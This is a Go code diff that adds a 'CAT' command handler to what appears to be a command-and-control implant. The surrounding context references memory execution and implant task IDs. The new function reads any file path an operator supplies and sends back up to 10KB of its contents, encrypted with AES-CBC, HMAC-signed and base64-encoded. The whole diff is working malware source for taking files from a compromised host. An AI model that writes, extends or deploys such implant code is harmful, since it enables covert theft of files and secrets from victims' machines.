@@ -303,3 +303,50 @@ func HandleMEMEXEC(ctx *CommandContext, payload []byte, tid [8]byte) string {
 	return taskRestEnc
 }
 
+// HandleCAT handles the CAT command - reads and returns file contents (first 10KB)
+func HandleCAT(ctx *CommandContext, payload []byte, tid [8]byte) string {
+	println("\n-> CAT")
+
+	// Get filename from payload
+	filename := string(payload)
+	if filename == "" {
+		responseTaskPayload := "Error: No filename provided for cat"
+		taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
+		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
+		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
+		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
+		println(taskRestEnc)
+		return taskRestEnc
+	}
+
+	// Read file contents
+	fileData, err := os.ReadFile(filename)
+	if err != nil {
+		responseTaskPayload := fmt.Sprintf("Error reading file %s: %s", filename, err.Error())
+		taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
+		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
+		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
+		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
+		println(taskRestEnc)
+		return taskRestEnc
+	}
+
+	// Limit to first 10KB
+	const maxSize = 10 * 1024 // 10KB
+	var responsePayload string
+
+	if len(fileData) > maxSize {
+		responsePayload = fmt.Sprintf("[File size: %d bytes - showing first 10KB]\n\n%s\n\n[... truncated ...]", len(fileData), string(fileData[:maxSize]))
+		println(fmt.Sprintf("Cat file %s (%d bytes, truncated to 10KB)", filename, len(fileData)))
+	} else {
+		responsePayload = string(fileData)
+		println(fmt.Sprintf("Cat file %s (%d bytes)", filename, len(fileData)))
+	}
+
+	taskResp := PackResponse(ctx.Implant, []byte(responsePayload), tid)
+	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
+	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
+	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
+	println(taskRestEnc)
+	return taskRestEnc
+}
